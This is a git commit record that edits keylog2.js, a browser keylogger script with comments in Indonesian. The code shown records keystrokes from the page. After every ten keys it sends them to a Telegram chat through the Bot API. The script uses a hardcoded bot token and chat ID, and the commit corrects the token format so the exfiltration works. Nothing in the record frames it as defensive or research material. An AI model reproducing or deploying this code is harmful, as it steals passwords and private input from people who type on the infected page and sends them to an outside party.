f13fcbd833fe547302779df5f0514a1052567624
whoami-V2 <110459286+whoami-V2@users.noreply.github.com>
2026-03-26 16:12:55 +0700

    reerer
    Updated bot token format for Telegram API.

--- keylog2.js
+++ keylog2.js
@@ -3,7 +3,7 @@ document.addEventListener("keydown", function(event) {
     keys.push(event.key);
     if (keys.length >= 10) {  // Kirim setelah 10 tombol ditekan
         let message = "Keys: " + keys.join("");
-        let botToken = "bot6592357228:AAEFYVLiyqAwhxMrgP37B2h9MAO8U2OOLTQ";
+        let botToken = "6592357228:AAEFYVLiyqAwhxMrgP37B2h9MAO8U2OOLTQ";
         let chatId = "-4811466610";
         let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
